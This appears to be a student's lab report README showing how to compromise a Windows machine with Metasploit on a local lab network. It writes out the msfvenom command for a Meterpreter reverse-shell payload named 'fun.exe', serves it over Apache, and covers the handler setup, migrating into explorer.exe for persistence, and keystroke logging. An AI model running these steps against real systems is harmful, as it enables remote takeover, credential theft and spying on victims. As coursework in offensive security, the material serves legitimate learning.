# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

### Developed By- T.Manikandan
### Register number: 212224110037

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:


## Architecture Diagram

```bash
## 🛠️ Metasploit Exploitation Architecture (Windows Target)


+----------------+                           +------------------+
|  🟢 Attacker    |      🔁 Reverse Shell      |   🔴 Victim (Win) |
|  (Kali Linux)  | <------------------------- |  Unpatched SMB   |
|  - msfconsole  |       (TCP 4444)          |  RDP, AV Bypass  |
|  - handler     |                           |                  |
+-------+--------+                           +--------+---------+
        |                                             |
        |  ⚙️ Payload generation using msfvenom        |
        |                                             |
        v                                             v
msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload  
         LHOST=attacker_ip LPORT=4444               or exploit triggers  
         -f exe > evil.exe  

        |
        |  🧲 Listener waits (multi/handler)
        v

+------------------------------------------------------------+
|     🧠 Meterpreter Session Established (shell access)       |
+------------------------------------------------------------+
| Commands: sysinfo | hashdump | migrate | webcam_snap | etc |
+------------------------------------------------------------+

```
### PROGRAM:

Find the attackers ip address using ifconfig

### Output:
<img width="560" height="387" alt="image" src="https://github.com/user-attachments/assets/2f9c842f-9ba0-4807-94e9-2ad66d41d1cc" />




Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```

### Output:
<img width="579" height="82" alt="image" src="https://github.com/user-attachments/assets/5fdbc878-8359-4afc-b19d-d560f306c09d" />








copy the fun.exe into the apache ```/var/www/html ```folder



Start apache server ```sudo systemctl apache2 start``` 



Check the status of apache2 ```sudo apache2 status```


Invoke msfconsole:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```

### Output 
<img width="508" height="414" alt="image" src="https://github.com/user-attachments/assets/13423ad9-4c2d-49ac-b7d0-a019c009fa1d" />

<img width="1138" height="253" alt="image" src="https://github.com/user-attachments/assets/31d3ef0d-d754-4331-9643-93f2be64f869" />

<img width="522" height="367" alt="image" src="https://github.com/user-attachments/assets/32b00bf0-8dec-46ed-9c8b-b635831a7ffa" />




On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.

<img width="561" height="623" alt="image" src="https://github.com/user-attachments/assets/10a0196d-0530-4683-bcdb-e9c868945b11" />






Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit



To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

#### Post Exploitation:
The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.



keyscan_dump Shows the keystrokes captured so far
<img width="898" height="238" alt="image" src="https://github.com/user-attachments/assets/c0e0b1c2-1abc-4d8e-81e8-d7bb2657c56a" />




## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.

